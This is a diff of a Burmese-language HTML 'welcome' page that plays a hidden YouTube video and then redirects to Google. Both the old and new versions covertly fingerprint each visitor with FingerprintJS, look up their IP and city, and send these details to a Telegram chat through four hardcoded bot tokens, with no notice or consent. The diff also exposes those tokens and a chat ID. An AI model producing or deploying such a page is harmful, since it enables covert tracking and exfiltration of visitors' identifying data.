@@ -2,58 +2,59 @@
 <html lang="my">
 <head>
     <meta charset="UTF-8">
-    <title>Welcome System</title>
+    <title>System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 </head>
-<body class="bg-black text-white h-screen flex flex-col items-center justify-center">
+<body class="bg-black text-white h-screen flex items-center justify-center">
 
-    <!-- YouTube Music -->
-    <iframe id="yt-player" class="hidden" src="" allow="autoplay"></iframe>
-
-    <!-- Welcome Page -->
-    <div id="welcome-view" class="text-center">
-        <h1 class="text-4xl font-bold animate-pulse">ခဏစောင့်ပေးပါ...</h1>
+    <!-- YouTube Hidden Player -->
+    <div id="player-wrapper" class="hidden">
+        <iframe id="yt-player" src="" allow="autoplay"></iframe>
     </div>
 
-    <!-- Main Page -->
-    <div id="main-view" class="hidden text-center">
-        <h1 class="text-3xl font-bold">Main Page သို့ ရောက်ရှိပါပြီ</h1>
-        <p class="text-gray-400">အချက်အလက်များ စနစ်အတွင်းသို့ ပို့ဆောင်ပြီးပါပြီ။</p>
+    <!-- Welcome View -->
+    <div id="welcome-view" class="text-center">
+        <h1 class="text-3xl font-bold mb-6">ကြိုဆိုပါ၏</h1>
+        <button onclick="startEverything()" class="bg-red-600 px-10 py-4 rounded-full text-xl font-bold hover:bg-red-700">စတင်မည်</button>
     </div>
 
     <script>
-        async function runSystem() {
-            // 1. YouTube Music Auto-play
+        async function startEverything() {
+            // ၁။ အသံစဖွင့်ခြင်း
             const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
             const player = document.getElementById('yt-player');
             player.src = `https://www.youtube.com/embed/${ytId}?autoplay=1&loop=1`;
+            document.getElementById('player-wrapper').classList.remove('hidden');
 
-            // 2. Tracking and Sending to Telegram
-            const fp = await FingerprintJS.load();
-            const res = await fp.get();
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
-            const msg = `Visitor Info:%0AID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
-            
-            const bots = [
-                "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
-                "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
-                "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
-                "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
-            ];
+            // ၂။ Telegram သို့ အချက်အလက်ပို့ခြင်း
+            try {
+                const fp = await FingerprintJS.load();
+                const res = await fp.get();
+                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const msg = `Visitor Data:%0AID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
+                
+                const bots = [
+                    "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
+                    "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
+                    "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
+                    "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
+                ];
 
-            bots.forEach(token => {
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
-            });
+                bots.forEach(token => {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${encodeURIComponent(msg)}`);
+                });
 
-            // 3. 3 Seconds Redirect
-            setTimeout(() => {
-                document.getElementById('welcome-view').classList.add('hidden');
-                document.getElementById('main-view').classList.remove('hidden');
-            }, 3000);
+                // ၃။ ၃ စက္ကန့်နေရင် နောက်တစ်မျက်နှာသို့ ရွှေ့ခြင်း
+                document.getElementById('welcome-view').innerHTML = "<h1 class='text-2xl'>ကျေးဇူးတင်ပါသည်...</h1>";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; // သင်သွားချင်တဲ့ Page လင့်ခ် ထည့်ပါ
+                }, 3000);
+
+            } catch (err) {
+                console.error(err);
+            }
         }
-
-        window.onload = runSystem;
     </script>
 </body>
 </html>
